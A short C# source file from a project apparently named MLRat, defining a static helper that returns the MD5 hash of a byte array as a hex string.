using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace MLRat.Cryptography
{
    public static class Hash
    {
        public static string Md5(byte[] fBytes)
        {
            using (MD5 _md5 = new MD5CryptoServiceProvider())
            {
                byte[] md5HashBytes = _md5.ComputeHash(fBytes);
                StringBuilder sb = new StringBuilder();
                foreach (byte b in md5HashBytes)
                    sb.Append(b.ToString("x2"));
                return sb.ToString();
            }
        }
    }
}
